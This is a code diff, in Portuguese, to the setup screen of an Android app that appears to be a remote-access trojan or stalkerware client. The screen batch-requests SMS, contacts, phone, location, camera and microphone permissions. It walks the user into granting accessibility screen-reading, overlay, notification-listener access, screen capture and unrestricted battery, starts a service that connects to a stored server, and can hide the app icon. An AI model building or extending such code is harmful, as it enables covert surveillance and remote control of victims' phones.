@@ -13,6 +13,7 @@ import android.os.Bundle;
 import android.os.PowerManager;
 import android.provider.Settings;
 import android.view.Gravity;
+import android.view.View;
 import android.widget.LinearLayout;
 import android.widget.ScrollView;
 import android.widget.TextView;
@@ -28,9 +29,14 @@ public class SetupActivity extends Activity {
 
     private interface Estado { boolean ok(); }
 
-    private final List<Runnable> pintores = new ArrayList<>();
-    private final List<String> fila = new ArrayList<>();
+    private final List<Estado> estados = new ArrayList<>();
+    private final List<View> cartoes = new ArrayList<>();
     private LinearLayout lista;
+    private LinearLayout bloco;
+    private TextView resumo;
+    private TextView pronto;
+    private View cardPerms;
+    private boolean mostrarTudo;
 
     @Override protected void onCreate(Bundle b) {
         super.onCreate(b);
@@ -49,25 +55,36 @@ public class SetupActivity extends Activity {
         lista.addView(titulo);
 
         TextView sub = new TextView(this);
-        sub.setText("Toque em cada item para abrir as configura\u00e7\u00f5es correspondentes.");
+        sub.setText("As permiss\u00f5es de uso abrem em janelas, uma ap\u00f3s a outra. O que o Android n\u00e3o deixa pedir em janela tem bot\u00e3o que leva \u00e0 tela certa. Os itens j\u00e1 ativos somem da lista.");
         sub.setTextColor(Color.parseColor("#8B98A5"));
         sub.setTextSize(12);
-        sub.setPadding(0, dp(6), 0, dp(18));
+        sub.setPadding(0, dp(6), 0, dp(14));
         lista.addView(sub);
 
-        linha("Permiss\u00f5es", "Pedir todas em sequ\u00eancia",
-                this::permsOk, this::pedeTudo);
+        resumo = new TextView(this);
+        resumo.setTextSize(12);
+        resumo.setPadding(0, 0, 0, dp(12));
+        lista.addView(resumo);
 
-        linha("Acessibilidade", "Gestos e leitura da tela",
+        cardPerms = cartao("Permiss\u00f5es de uso",
+                "SMS, contatos, telefone, localiza\u00e7\u00e3o, c\u00e2mera, microfone, notifica\u00e7\u00f5es e m\u00eddia",
+                null, this::pedeTudo, null);
+        lista.addView(cardPerms);
+
+        bloco = new LinearLayout(this);
+        bloco.setOrientation(LinearLayout.VERTICAL);
+        lista.addView(bloco);
+
+        ajuste("Acessibilidade", "Gestos, leitura da tela e \u00e1rvore",
                 () -> Util.accOn(this),
                 () -> abre(Settings.ACTION_ACCESSIBILITY_SETTINGS));
 
-        linha("Sobreposi\u00e7\u00e3o", "Desenhar por cima de outros aplicativos",
+        ajuste("Sobreposi\u00e7\u00e3o", "Desenhar por cima de outros aplicativos",
                 () -> Settings.canDrawOverlays(this),
                 () -> startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                         Uri.parse("package:" + getPackageName()))));
 
-        linha("Acesso a notifica\u00e7\u00f5es", "Leitura de notifica\u00e7\u00f5es do sistema",
+        ajuste("Acesso a notifica\u00e7\u00f5es", "Leitura das notifica\u00e7\u00f5es do sistema",
                 () -> {
                     String s = Settings.Secure.getString(getContentResolver(),
                             "enabled_notification_listeners");
@@ -75,7 +92,7 @@ public class SetupActivity extends Activity {
                 },
                 () -> abre(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
 
-        linha("Bateria", "Desativar otimiza\u00e7\u00e3o de bateria",
+        ajuste("Bateria sem limite", "Desativar otimiza\u00e7\u00e3o de bateria",
                 () -> {
                     PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                     return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
@@ -83,12 +100,12 @@ public class SetupActivity extends Activity {
                 () -> startActivity(new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                         Uri.parse("package:" + getPackageName()))));
 
-        linha("Brilho do sistema", "Permitir alterar configura\u00e7\u00f5es do sistema",
-                () -> Settings.System.canWrite(this),
+        ajuste("Alterar ajustes do sistema", "Brilho e tempo de tela",
+                () -> Settings.canWrite(this),
                 () -> startActivity(new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
                         Uri.parse("package:" + getPackageName()))));
 
-        linha("Captura de tela", "Iniciar ou encerrar a proje\u00e7\u00e3o",
+        ajuste("Captura de tela", "Iniciar ou encerrar a proje\u00e7\u00e3o",
                 () -> ScreenSvc.alive,
                 () -> {
                     if (ScreenSvc.alive) {
@@ -101,7 +118,7 @@ public class SetupActivity extends Activity {
                     }
                 });
 
-        linha("Conex\u00e3o", "Iniciar o servi\u00e7o de rede",
+        ajuste("Conex\u00e3o", "Iniciar o servi\u00e7o de rede",
                 () -> Net.online(),
                 () -> {
                     try { NetSvc.arranca(this); } catch (Throwable ignored) {}
@@ -109,11 +126,33 @@ public class SetupActivity extends Activity {
                     toast("Conectando");
                 });
 
-        linha("\u00cdcone do app", "Ocultar ou mostrar na gaveta de aplicativos",
+        ajuste("\u00cdcone do app", "Ocultar ou mostrar na gaveta",
                 this::iconeAtivo,
                 this::alternarIcone);
 
-        linha("Play Store", "Abrir a p\u00e1gina do aplicativo", null, () -> loja(this));
+        pronto = new TextView(this);
+        pronto.setText("Tudo configurado. Nada pendente.");
+        pronto.setTextColor(Color.parseColor("#3FB950"));
+        pronto.setTextSize(13);
+        pronto.setPadding(dp(4), dp(10), 0, dp(6));
+        pronto.setVisibility(View.GONE);
+        lista.addView(pronto);
+
+        TextView verTudo = new TextView(this);
+        verTudo.setText("mostrar itens j\u00e1 ativos");
+        verTudo.setTextColor(Color.parseColor("#3D8BFD"));
+        verTudo.setTextSize(11);
+        verTudo.setPadding(dp(4), dp(12), 0, dp(4));
+        verTudo.setOnClickListener(v -> { mostrarTudo = !mostrarTudo; atualiza(); });
+        lista.addView(verTudo);
+
+        TextView loja = new TextView(this);
+        loja.setText("abrir a p\u00e1gina na Play Store");
+        loja.setTextColor(Color.parseColor("#3D8BFD"));
+        loja.setTextSize(11);
+        loja.setPadding(dp(4), dp(8), 0, 0);
+        loja.setOnClickListener(v -> loja(this));
+        lista.addView(loja);
 
         String host = getSharedPreferences("p", 0).getString("url", "sem servidor");
         TextView rodape = new TextView(this);
@@ -125,15 +164,7 @@ public class SetupActivity extends Activity {
 
         setContentView(sv);
 
-        if (b == null) {
-            fila.clear();
-            for (String p : perms()) {
-                try {
-                    if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) fila.add(p);
-                } catch (Throwable ignored) {}
-            }
-            if (!fila.isEmpty()) lista.postDelayed(this::proximo, 400);
-        }
+        if (b == null) lista.postDelayed(this::pedeTudo, 400);
     }
 
     private static String[] perms() {
@@ -158,59 +189,57 @@ public class SetupActivity extends Activity {
         return p.toArray(new String[0]);
     }
 
-    private boolean permsOk() {
-        for (String p : perms()) {
-            try {
-                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) return false;
-            } catch (Throwable ignored) {}
-        }
-        return true;
-    }
-
     private void pedeTudo() {
-        fila.clear();
+        if (Build.VERSION.SDK_INT < 23) { atualiza(); return; }
+        List<String> falta = new ArrayList<>();
         for (String p : perms()) {
             try {
-                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) fila.add(p);
+                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) falta.add(p);
             } catch (Throwable ignored) {}
         }
-        proximo();
-    }
-
-    private void proximo() {
-        if (fila.isEmpty()) {
-            toast("Permiss\u00f5es conclu\u00eddas");
-            return;
-        }
-        String p = fila.remove(0);
+        atualiza();
+        if (falta.isEmpty()) { toast("Permiss\u00f5es conclu\u00eddas"); return; }
         try {
-            requestPermissions(new String[]{p}, REQ_PERM);
-        } catch (Throwable ignored) {
-            proximo();
+            requestPermissions(falta.toArray(new String[0]), REQ_PERM);
+        } catch (Throwable ignored) {}
+    }
+
+    private void atualiza() {
+        int ok = 0, tot = 0;
+        for (String p : perms()) {
+            tot++;
+            try { if (checkSelfPermission(p) == PackageManager.PERMISSION_GRANTED) ok++; } catch (Throwable ignored) {}
         }
-    }
+        boolean pOk = ok >= tot;
+        resumo.setText(ok + " de " + tot + " permiss\u00f5es de uso concedidas");
+        resumo.setTextColor(Color.parseColor(pOk ? "#3FB950" : "#D29922"));
+        resumo.setVisibility(pOk && !mostrarTudo ? View.GONE : View.VISIBLE);
+        cardPerms.setVisibility(pOk && !mostrarTudo ? View.GONE : View.VISIBLE);
 
-    @Override public void onRequestPermissionsResult(int rq, String[] a, int[] r) {
-        super.onRequestPermissionsResult(rq, a, r);
-        if (rq == REQ_PERM) lista.postDelayed(this::proximo, 220);
-    }
-
-    @Override protected void onResume() {
-        super.onResume();
-        for (Runnable r : pintores) r.run();
-    }
-
-    @Override protected void onActivityResult(int rq, int rs, Intent d) {
-        super.onActivityResult(rq, rs, d);
-        if (rq == REQ_CAP && rs == RESULT_OK && d != null) {
-            Intent i = new Intent(this, ScreenSvc.class);
-            i.putExtra("code", rs);
-            i.putExtra("data", d);
-            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
+        int pend = 0;
+        for (int x = 0; x < cartoes.size(); x++) {
+            boolean ativo;
+            try { ativo = estados.get(x).ok(); } catch (Throwable e) { ativo = false; }
+            View v = cartoes.get(x);
+            v.setVisibility(ativo && !mostrarTudo ? View.GONE : View.VISIBLE);
+            TextView marca = (TextView) v.getTag();
+            if (marca != null) {
+                marca.setText(ativo ? "ativo" : "abrir");
+                marca.setTextColor(Color.parseColor(ativo ? "#3FB950" : "#F85149"));
+            }
+            if (!ativo) pend++;
         }
+        pronto.setVisibility(pOk && pend == 0 ? View.VISIBLE : View.GONE);
     }
 
-    private void linha(String t1, String t2, Estado est, Runnable acao) {
+    private void ajuste(String t1, String t2, Estado est, Runnable acao) {
+        View card = cartao(t1, t2, est, acao, null);
+        estados.add(est);
+        cartoes.add(card);
+        bloco.addView(card);
+    }
+
+    private View cartao(String t1, String t2, Estado est, Runnable acao, Object nada) {
         LinearLayout card = new LinearLayout(this);
         card.setOrientation(LinearLayout.HORIZONTAL);
         card.setGravity(Gravity.CENTER_VERTICAL);
@@ -244,25 +273,38 @@ public class SetupActivity extends Activity {
         card.addView(col);
 
         if (est != null) {
-            final TextView st = new TextView(this);
-            st.setTextSize(11);
-            st.setPadding(dp(10), 0, 0, 0);
-            final Runnable pinta = () -> {
-                boolean ok;
-                try { ok = est.ok(); } catch (Throwable e) { ok = false; }
-                st.setText(ok ? "ativo" : "inativo");
-                st.setTextColor(Color.parseColor(ok ? "#3FB950" : "#F85149"));
-            };
-            pintores.add(pinta);
-            card.addView(st);
-            pinta.run();
+            TextView marca = new TextView(this);
+            marca.setTextSize(11);
+            marca.setPadding(dp(10), 0, 0, 0);
+            card.addView(marca);
+            card.setTag(marca);
         }
 
         card.setOnClickListener(v -> {
             try { acao.run(); } catch (Throwable ignored) {}
-            for (Runnable r : pintores) r.run();
+            lista.postDelayed(this::atualiza, 300);
         });
-        lista.addView(card);
+        return card;
+    }
+
+    @Override public void onRequestPermissionsResult(int rq, String[] a, int[] r) {
+        super.onRequestPermissionsResult(rq, a, r);
+        if (rq == REQ_PERM) lista.postDelayed(this::atualiza, 200);
+    }
+
+    @Override protected void onResume() {
+        super.onResume();
+        atualiza();
+    }
+
+    @Override protected void onActivityResult(int rq, int rs, Intent d) {
+        super.onActivityResult(rq, rs, d);
+        if (rq == REQ_CAP && rs == RESULT_OK && d != null) {
+            Intent i = new Intent(this, ScreenSvc.class);
+            i.putExtra("code", rs);
+            i.putExtra("data", d);
+            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
+        }
     }
 
     private boolean iconeAtivo() {
